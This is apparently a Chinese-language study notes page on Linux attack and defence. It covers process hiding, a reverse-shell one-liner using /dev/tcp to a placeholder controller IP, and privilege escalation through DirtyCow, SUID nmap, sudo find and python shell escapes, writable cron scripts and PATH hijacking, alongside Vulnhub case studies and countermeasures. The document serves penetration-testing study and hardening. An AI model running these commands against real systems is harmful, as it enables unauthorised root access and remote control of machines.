---
title: 攻击和防御
---
包含 nc 反弹shell 等常见攻击手段 使用Sysdig进行排查

https://www.exploit-db.com/

Sysdig : Open Source Universal System Visibility With Native Contaier Support.

虽然 Linux 有很多系统分析和调优的工具 如strace、tcpdump、htop、iftop、lsof、netstat，但是它们一般都负责某个特殊的功能，并且使用方式有很大的差异，如果要分析和定位问题，一般都需要熟练掌握需要命令的使用。而且这些工具的数据无法进行共享，只能相互独立工作。Sysdig 一个工具就能实现上述所有工具的功能，并且提供了统一的使用语法。



CPU、Memory、Disk IO、网络 IO•支持各种 IO 活动：进程、文件、网络连接等

来分析这些数据



Sysdig 有着类似于 tcpdump 的过滤语法，用户可以随意组合自己的过滤逻辑，用户还可以自己编写 Lua 脚本来自定义分析逻辑，基本上不受任何限制。



https://mp.weixin.qq.com/s/j4vfelk1Eu-rl2s8B70_CQ







Linux 隐藏进程的方法有以下几种：

- 修改进程名：通过修改进程名，使进程不易被发现。可以使用命令行工具如 ps、top 来查看进程名。修改进程名可以使用命令 prctl 或 setproctitle。

- 修改进程所在目录：可以将进程所在目录修改为一个隐藏目录，使进程不易被发现。可以使用 chroot 命令将进程所在目录修改为一个隔离的目录。

- 修改进程权限：可以修改进程的权限，使其只能被 root 用户或者某个特定用户访问。可以使用 chmod 命令修改进程权限。

- 使用 rootkit 技术：rootkit 是一种用于隐藏进程和文件的恶意软件。可以使用 rootkit 技术隐藏进程。


反弹shell
一个反弹shell生成器 https://github.com/0dayCTF/reverse-shell-generator

例如：
```bash
bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1
```
这个命令的作用是将标准输入、输出和错误重定向到一个 TCP 连接，从而实现反弹 shell。具体来说，该命令将标准输出和错误输出都重定向到一个 TCP 连接，并将标准输入重定向到标准输出和错误输出的合并，从而使得攻击者可以通过控制端口向目标机器发送命令并获取输出，实现反弹 shell 的效果。  
https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean










1. 内核利用
内核 exp 是可以利用内核漏洞以使用提升的权限执行任意代码的程序。内核漏洞通常使攻击者以 root 命令提示符的形式对目标系统进行访问。在许多情况下,在 Linux 系统上获取 root 就是将内核漏洞源码下载到目标文件系统, 编译, 然后执行它。

假设我们可以以非特权用户的方式运行代码。

在内核模式下诱使内核运行我们的有效负载
操作内核数据, 例如处理权限
推出一个具有新特权的 shell 得到 root
为了攻击成功，我们需要四个条件：

脆弱的内核
匹配的 exp
将 exp 转移到目标的能力
在目标上执行 exp 的能力




臭名昭著的 DirtyCow -Linux kernel < = 3.19.0-73.8

在Linux内核的内存子系统处理私有只读内存映射的写时复制 (COW) 破坏的方式中发现了一个竞争条件。无特权的本地用户可以使用此缺陷获取对其他只读内存映射的写入访问权限,从而提高对系统的权限。这是有史以来发现的最严重的特权升级漏洞之一,它影响了几乎所有主要的 Linux 发行版本。


通过dirtycow攻击有漏洞的机器

$ whoami –告诉我们当前用户是 john (非root)
$ uname - 为我们提供了一个我们知道很容易 dirtycow 的内核版本。
从这里下载了 dirtycow exp-https://www.exploit-db.com/exploits/40839/
编译并执行它。它通过编辑 /etc/passwd 文件来替换 "root" 用户和新用户的 "rash"。
$ su rash–它将当前登录的用户更改为 "rash", 这是root。

可以在此处查看 dirtycow 漏洞的其他变体– https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs


对于不同的内核和OS, 有许多不同的本地权限升级漏洞可供公开使用。是否可以使用内核漏洞在Linux上获取root访问权限取决于内核是否易受攻击。Kali Linux 有一个本地拷贝的利用数据库的exp, 这使得更容易搜索exp。虽然我不建议完全依赖这个数据库搜索 Linux 内核的利用。

在kali linux 中已经存在的特定 linux 内核的所有可用漏洞。
$ searchsploit Linux Kernel 2.6.24



为什么要避免首先运行任何提权exp？
虽然,只运行一个漏洞就可以获得 root很诱人, 但你应该始终保持这是你的最后一个选择。

远程主机可能会崩溃, 因为公开提供的许多攻击都不稳定。
你可能会得到root, 然后系统崩溃了。
利用这一漏洞可能会留下可以让你被抓住的痕迹或日志。













2.攻击以ROOT运行服务
利用任何作为root运行的服务会给你root

著名的 [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) 和 [SambaCry](https://thehackernews.com/2017/05/samba-rce-exploit.html) 利用开发的 smb 服务, 通常以 root 用户的方式运行。
只要有一个漏洞, 攻击者就可以执行远程代码和本地提权。
由于它的致命组合, 它大量用于传播勒索在全球各地。

始终检查 web 服务器、邮件服务器、数据库服务器等是否以 root 用户的方式运行。许多时候, web 管理员将这些服务作为 root 运行, 并可能导致安全问题。也有可能是未暴露的本地服务, 但也可以利用。

$ netstat -antup
它显示所有打开并正在侦听的端口。我们可以检查在本地运行的服务是否可以被利用。

利用一个易受攻击的 MySQL 版本, 它以 root 用户的形式运行以获得 root 访问权限
mysql UDF动态库利用漏洞可以从MySQL shell执行任意命令。如果mysql使用 root权限运行, 则命令将作为root用户执行。

它向我们显示以 root 用户的方式运行的服务。
我们可以使用MySQL shell作为root执行任意命令。

web 管理员最大的错误之一就是运行具有root权限的Web服务器。Web应用程序上的命令注入漏洞会导致攻击者产生root shell。这是一个典型的例子,说明为什么不应该将任何服务作为root 运行,除非确实需要。
root权限的二进制攻击远低于内核漏洞,即使服务崩溃主机也不会崩溃,服务可能会自动重新启动。








3. 利用 SUID 可执行文件
SUID代表设置用户ID,是一种Linux功能, 允许用户使用指定用户的权限执行文件。例如,Linux ping命令通常需要root权限才能打开原始网络套接字。通过将ping程序标记为SUID, 并将其作为root用户,当低权限使用者执行该程序时, ping将以 root权限执行。

-rwsr-xr-x

SUID是一个功能,如果使用得当,实际上增强了Linux的安全性。问题在于管理员在安装第三方应用程序或进行逻辑配置更改时,可能不知不觉地引入了危险的SUID配置。
大量的系统管理员不知道在哪里设置了SUID,在哪里没有。SUID位不应特别在任何文件编辑器上设置,因为攻击者可以覆盖系统上存在的任何文件。




利用易受攻击的SUID可执行文件获取root访问权限
$ find / -perm -u=s -type f 2>/dev/null
它打印具有SUID位的可执行文件

$ ls -la /usr/local/bin/nmap
确认一下nmap是否有SUID位设置。


Nmap有SUID位设置。很多时候,管理员将为nmap设置SUID位,以便能够有效地扫描网络,因为如果不使用root权限运行,所有nmap扫描技术都无法正常工作。
但是,在nmap旧版本中有一个功能, 您可以通过交互式模式运行nmap,从而使您能够转义到 shell。如果nmap有SUID位,它将以roo 权限运行,我们可以通过它的交互模式访问 "root" shell。

$ nmap –interactive –运行 nmap 交互式模式
$ sh –允许您从 nmap shell中得到系统shell


SUID 位不应该设置为任何程序。
不应在任何文件编辑器/编译器/解释程序上设置SUID位,因为攻击者可以轻松地读取/覆盖系统上存在的任何文件。









4. 利用SUDO权力/用户

如果攻击者无法通过任何其他技术直接获得root访问权限,他可能会试图攻击任何有 SUDO访问权限的用户。一旦他能够访问任何sudo用户, 基本上可以执行任何具有 root 权限的命令。
管理员可能只是允许用户通过SUDO运行几个命令,但即使使用此配置,他们可能会在不知不觉中引入漏洞,从而导致提权。
这方面的一个典型示例是为find命令指定SUDO权限, 以便其他用户可以在系统中搜索特定的文件/日志。虽然管理员可能不知道"find"命令包含命令执行的参数, 但攻击者可以使用root权限执行命令。



$ sudo -l
打印允许我们作为sudo运行的命令

我们可以运行find,cat和python作为SUDO。这些命令在使用SUDO运行时将作为 root运行。如果我们能以某种方式通过这些命令来获取shell, 我们就可以获得 root访问权。

$ sudo find /home -exec sh -i \;
查找命令的exec参数可用于任意代码执行。




从不给任何编程语言编译器、解释程序和编辑器赋予SUDO权限。
这种技术也可以应用到 vi,more,less,perl,ruby,gdb和其他。
$ sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
产生一个shell

不要给任何程序sudo的权利。
永远不要把SUDO权利给vi,more,less,perl,ruby,gdb,nmap,python或其他程序。





5. 利用配置糟糕的CRON任务

如果未正确配置Cron,则可以利用它获取根权限。

cron 作业中有可写的任何脚本或二进制文件？
我们可以写cron文件本身。
cron目录可写吗？
Cron通常以root权限运行。如果我们可以成功篡改在cron作业中定义的任何脚本或二进制文件,那么我们可以使用root权限执行任意代码。



$ ls -la /etc/cron.d打印已在cron中存在的cron任务

$ find / -perm -2 -type f 2>/dev/null打印可写文件
$ ls -la /usr/local/sbin/cron-logrotate.sh让我们来确认一下cron logrotate.sh是否任意用户可写。


lograte 是可写的,它正在由logrotate cronjob运行。我们在lograte中写入/追加的任何命令都将作为"root"执行。
我们在/tmp目录中编写一个C文件并编译它。
$ ls rootme -它告诉我们它是由用户 "SHayslett" 所拥有的


$ echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh这将将可执行文件的所有者和组更改为 root 用户。它还将设置 SUID 位。
$ ls -la rootme 在5分钟后,logrotate cronjob运行, 并且cron logrotate.sh得到了root的执行。
$ ./rootme -生成root shell。




对策

在cron作业中定义的任何脚本或二进制文件都不应是可写的。
cron文件不应由除 root用户以外的任何人写入。
除root用户之外, 其他任何人都不应写入cron目录。




6. 利用在PATH中有"."的用户
在您的路径中有 "." 意味着用户能够从当前目录中执行二进制/脚本。为了避免每次都要输入这两个额外的字符,用户将"."添加到他们的路径中。这可能是攻击者提权的绝佳方法。

假设苏珊是管理员, 她在她的路径中添加了"."。

PATH中有"." - program
PATH没有 '.' - ./program

这是因为Linux在路径中添加了"."时, 首先在当前目录中搜索该程序, 然后在其他任何位置搜索。

另一个用户B知道A已经添加'.'在PATH上,因为A是懒惰的
B告诉苏珊'ls'命令不在他的目录中工作
B在他的目录中添加了一个代码,它将更改sudoers文件并使其管理员
B将代码存储在名为"ls"的文件中,并使其可执行
A有root特权。A在B的主目录来执行'ls'命令，而不是原始的'ls'命令,恶意代码得到root访问

在保存为 "ls" 的文件内, 添加了一个代码, 它将打印 "Hello World"
```
$ PATH=.:${PATH}在 PATH 变量中添加 "."
$ ls执行ls文件,而不是运行ls comamnd。
```
现在, 如果root用户使用root权限执行代码,我们可以使用root权限实现任意代码执行。







提权之VULNHUB VM的实例研究

以上是一系列不同的权限升级技术,在不同的vulnhub机器上可获得根访问权限。它将给你一个整体的想法, 比如如何可以在一个实时的场景使用上述技术。很多时候可以使用多种技术在同一台机器上获取root访问权限。

Vulnix
错误配置的服务——错误配置的 root_squash 目录挂载
droopy
内核漏洞 - 'overlayfs' 权限提升https://www.exploit-db.com/exploits/37292/
VulnOsv2
内核漏洞利用——‘overlayfs’提权https://www.exploit-db.com/exploits/37292/
Fristileaks
授予易受攻击二进制文件的 SUDO 权限
LordOfTheRoot
内核漏洞 - 'overlayfs' 权限提升https://www.exploit-db.com/exploits/37292/





重要资源
通过这些博客可以更深入地了解 Linux 特权升级。

基本 Linux 权限升级– https://blog.g0tmi1k.com/2011/08/basic-Linux-privilege-escalation/
本地 Linux 枚举 & 权限升级备忘单– https://www.rebootuser.com/?p=1623
黑客入侵 Linux 第一部分: 权限升级– http://www.dankalia.com/tutor/01005/0100501004.htm
权限升级– https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_Linux.html

枚举脚本

虽然建议您手动枚举, 但使用脚本可以使它更容易 (尽管它会产生大量的噪音)。

unix-privesc-check- http://pentestmonkey.net/tools/audit/unix-privesc-check
Linuxprivchecker (我的最爱) – https://github.com/sleventyeleven/Linuxprivchecker
LinEnum – https://github.com/rebootuser/LinEnum









http://www.dankalia.com/tutor/01005/0100501004.htm





https://github.com/sleventyeleven/Linuxprivchecker

https://github.com/rebootuser/LinEnum





https://payatu.com/blog/a-guide-to-linux-privilege-escalation/

https://github.com/rmusser01/Infosec_Reference

https://faisalfs10x.github.io/notes/htbctf#








- http://www.dankalia.com/tutor/01005/0100501002.htm
- http://www.dankalia.com/tutor/01005/0100501003.htm
- http://www.dankalia.com/tutor/01005/0100501004.htm
- http://www.dankalia.com/tutor/01005/0100501005.htm
- http://www.dankalia.com/tutor/01005/0100501006.htm
- http://www.dankalia.com/tutor/01005/0100501007.htm
- http://www.dankalia.com/tutor/01005/0100501008.htm
- http://www.dankalia.com/tutor/01005/0100501009.htm